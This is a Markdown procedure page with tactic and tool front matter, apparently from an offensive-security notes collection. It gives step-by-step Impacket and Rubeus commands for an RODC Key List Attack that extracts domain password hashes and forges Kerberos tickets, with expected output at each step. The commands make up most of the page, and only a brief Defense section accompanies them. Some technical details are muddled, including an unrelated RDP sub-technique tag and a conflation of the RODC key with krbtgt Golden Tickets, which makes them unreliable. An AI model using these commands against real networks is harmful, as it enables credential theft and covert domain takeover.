---
type: procedure
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credentials in Files]]'
  - '[[Steal or Forge Kerberos Tickets]]'
sub_techniques:
  - '[[Golden Ticket]]'
  - '[[cme-smb-enable-rdp]]'
tags:
  - active-directory-attacks
  - rodc-key-list-attack
  - rodc-read-only-domain-controller
commands:
  - '[[commands/impacket-keylistattack-full-enumeration]]'
  - '[[commands/impacket-keylistattack-target-user]]'
  - '[[commands/impacket-secretsdump-with-keylist]]'
  - '[[commands/rubeus-create-golden-ticket]]'
  - '[[commands/rubeus-asktgs-with-keylist]]'
tools:
  - '[[tools/Impacket]]'
  - '[[tools/Rubeus]]'
platforms:
  - Windows
verified: true
validated: true
---

# RODC-Key-List-Extraction-and-Golden-Ticket-Creation

## Summary

This procedure outlines the RODC Key List Attack to extract password hashes of domain users from a Read-Only Domain Controller (RODC) by requesting the RODC's key list from the Key Distribution Center (KDC). The extracted hashes enable forging a Golden Ticket using Kerberos ticket manipulation, granting the attacker domain administrator-level access without further authentication.

## Description

In Active Directory environments, RODCs store a subset of domain secrets, including a key list of user password hashes for ticket encryption. An attacker with RODC access and valid domain credentials can compel the KDC to disclose this key list via RPC calls. Tools from the Impacket suite facilitate hash extraction through SAMR enumeration or targeted queries. Once hashes are obtained, Rubeus can forge a Kerberos Ticket Granting Ticket (TGT) for any user, such as the krbtgt account, creating a 'Golden Ticket' for persistent, undetected domain access. This technique is effective in hybrid or branch office setups with RODCs and bypasses many credential-guarding measures if the RODC key is compromised.

## Requirements

1. Valid domain user credentials with access to the RODC (e.g., via initial foothold on the RODC or network segment).
2. Knowledge of the RODC's identifier (rodcNo) and AES key (rodcKey), typically obtained from prior enumeration or RODC compromise.
3. Impacket suite installed on a Linux or compatible system for hash extraction.
4. Rubeus executable on a Windows system for ticket forging.
5. Network connectivity to the domain KDC and RODC.

## Defense

- Restrict RODC access using Group Policy to deny replication of privileged accounts and limit password replication to essential services.
- Monitor for anomalous RPC calls to the KDC requesting RODC key lists (Event ID 4768/4769 in Kerberos logs).
- Enable Kerberos Armoring (FAST) and use Protected Users group to invalidate forged tickets.
- Regularly rotate the krbtgt account password to invalidate existing Golden Tickets.
- Deploy tools like Microsoft ATA or ETW logging for Kerberos ticket requests.

## Objectives

1. Extract the RODC key list containing user NTLM hashes.
2. Use extracted hashes to forge a Golden Ticket for domain persistence.
3. Validate the ticket by requesting service tickets (TGS) for domain resources.

## Instructions

1. Extract hashes using full SAMR enumeration to retrieve all possible user credentials from the RODC key list.
   - Command: [[commands/impacket-keylistattack-full-enumeration]]
   ```bash
   keylistattack.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_RODC_HOST -rodcNo $_RODC_NO -rodcKey $_RODC_KEY -full
   ```
   - Expected: A list of domain users and their NTLM hashes output to stdout, which can be saved for offline cracking or direct use.
   - Why: This step performs unfiltered enumeration to capture a broad set of hashes without specifying targets, ideal for initial discovery.

2. For targeted extraction, query a specific user in the RODC key list to obtain their hash efficiently.
   - Command: [[commands/impacket-keylistattack-target-user]]
   ```bash
   keylistattack.py -kdc $_KDC_HOST -t $_TARGET_USER -rodcNo $_RODC_NO -rodcKey $_RODC_KEY LIST
   ```
   - Expected: Output showing the specified user's details and NTLM hash, e.g., "User: admin, RID: 500, Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".
   - Why: Targets high-value accounts like administrators to minimize noise and focus on critical credentials.

3. Dump additional secrets using the extracted key list to pull NTDS.dit or SAM hashes from the RODC.
   - Command: [[commands/impacket-secretsdump-with-keylist]]
   ```bash
   secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_RODC_HOST -rodcNo $_RODC_NO -rodcKey $_RODC_KEY -use-keylist
   ```
   - Expected: Dump of RODC secrets including user hashes, krbtgt hash, and cached credentials in lsass format, saved to files like secretsdump.dmp.
   - Why: Complements key list extraction by retrieving full credential stores for comprehensive access.

4. Forge a Golden Ticket using the extracted krbtgt hash or RODC key to create a persistent TGT.
   - Command: [[commands/rubeus-create-golden-ticket]]
   ```powershell
   Rubeus.exe golden /rodcNumber:$_RODC_NO /aes256:$_RODC_AES_KEY /user:$_TARGET_USER /id:$_USER_RID /domain:$_DOMAIN /sid:$_DOMAIN_SID
   ```
   - Expected: A .kirbi file containing the forged TGT, e.g., "[*] Ticket successfully exported to: golden_ticket.kirbi".
   - Why: The Golden Ticket impersonates a domain admin, enabling access to any resource without re-authentication.

5. Request a TGS using the Golden Ticket to access specific services and validate persistence.
   - Command: [[commands/rubeus-asktgs-with-keylist]]
   ```powershell
   Rubeus.exe asktgs /enctype:aes256 /keyList /service:$_SERVICE/$_HOST /dc:$_DC_HOST /ticket:$_TGT_TICKET
   ```
   - Expected: Service ticket output in .kirbi format, confirming access, e.g., "[*] Service ticket successfully exported.".
   - Why: Tests the Golden Ticket's validity by requesting tickets for services like CIFS or HTTP, enabling lateral movement.
